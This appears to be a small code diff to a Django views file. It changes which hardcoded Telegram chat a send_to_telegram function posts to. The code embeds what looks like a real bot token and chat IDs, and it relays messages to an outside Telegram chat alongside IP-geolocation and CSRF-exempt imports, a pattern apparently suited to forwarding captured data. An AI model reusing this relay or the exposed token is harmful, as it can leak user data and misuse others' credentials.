@@ -1,5 +1,5 @@
 from django.shortcuts import render
-from django.http import JsonResponse
+from django.http import JsonResponse, HttpResponse
 from django.views.decorators.csrf import csrf_exempt
 import requests
 import base64
@@ -8,7 +8,7 @@ def send_to_telegram(message):
     token = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
     p_chat_id = "1374918767"
     chat_id = "7548826388"
-    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={p_chat_id}&text={message}"
     res = requests.get(url).json()
     return res
 def get_country_from_ip(ip_address):
